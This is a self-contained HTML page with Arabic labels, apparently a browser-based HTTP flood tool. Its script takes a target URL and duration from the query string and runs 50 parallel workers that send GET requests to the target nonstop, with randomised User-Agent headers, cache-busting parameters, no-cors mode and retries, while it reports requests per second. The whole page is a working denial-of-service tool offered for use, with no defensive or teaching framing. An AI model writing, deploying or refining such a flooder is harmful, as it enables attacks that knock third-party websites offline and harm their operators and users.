<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أداة إرسال طلبات فائقة السرعة</title>
    <script>
        const config = {
            parallelRequests: 50,      // عدد الطلبات المتوازية
            requestTimeout: 2000,     // وقت انتهاء الطلب
            cacheBusting: true,       // تجنب التخزين المؤقت
            maxRetries: 1             // عدد إعادة المحاولات لكل طلب فاشل
        };

        let stats = {
            total: 0,
            rps: 0,
            startTime: 0
        };
        let isRunning = false;
        let intervalId;

        function getQueryParams() {
            const params = new URLSearchParams(window.location.search);
            return {
                url: params.get('url') || '',
                time: parseInt(params.get('time')) || 10
            };
        }

        function getRandomHeaders() {
            const browsers = [
                `Chrome/${Math.floor(Math.random() * 20) + 80}`,
                `Firefox/${Math.floor(Math.random() * 20) + 70}`,
                `Safari/${Math.floor(Math.random() * 10) + 10}`
            ];
            return {
                'User-Agent': `Mozilla/5.0 (${Math.random() > 0.5 ? 'Windows NT 10.0' : 'Macintosh'}) AppleWebKit/537.36 (KHTML, like Gecko) ${browsers[Math.floor(Math.random() * browsers.length)]}`,
                'Accept': '*/*',
                'Cache-Control': 'no-cache'
            };
        }

        async function fireRequest(url, retries = config.maxRetries) {
            if (!isRunning) return;

            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), config.requestTimeout);

            try {
                const fullUrl = url + (config.cacheBusting ? `&_=${Date.now()}${Math.random().toString(36).slice(2)}` : '');
                const response = await fetch(fullUrl, {
                    method: 'GET',
                    headers: getRandomHeaders(),
                    mode: 'no-cors',
                    cache: 'no-store',
                    signal: controller.signal
                });
                stats.total++;
                stats.rps++;
            } catch (e) {
                if (retries > 0 && e.name !== 'AbortError') {
                    return fireRequest(url, retries - 1); // إعادة المحاولة
                }
            } finally {
                clearTimeout(timeout);
            }
        }

        async function startFlood(targetUrl, duration) {
            if (!targetUrl) {
                document.body.textContent = 'خطأ: يرجى إضافة ?url=الرابط_الهدف';
                return;
            }

            stats = { total: 0, rps: 0, startTime: Date.now() };
            isRunning = true;

            intervalId = setInterval(() => {
                document.body.textContent = `rps ${stats.rps} total ${stats.total}`;
                stats.rps = 0;
            }, 1000);

            const workerPool = Array(config.parallelRequests).fill().map(async () => {
                while (isRunning && Date.now() < stats.startTime + (duration * 1000)) {
                    await fireRequest(targetUrl);
                }
            });

            await Promise.all(workerPool);
            stopFlood();
        }

        function stopFlood() {
            isRunning = false;
            clearInterval(intervalId);
            document.body.textContent = `تم الإنتهاء | rps ${stats.rps} total ${stats.total}`;
        }

        window.onload = function() {
            document.body.style.margin = '0';
            document.body.style.padding = '0';
            document.body.style.fontFamily = 'monospace';
            document.body.style.fontSize = '24px';
            document.body.style.textAlign = 'center';
            document.body.style.paddingTop = '50px';
            document.body.style.backgroundColor = 'white';
            document.body.style.color = 'black';

            const { url, time } = getQueryParams();
            startFlood(url, time);
        };
    </script>
</head>
<body></body>
</html>
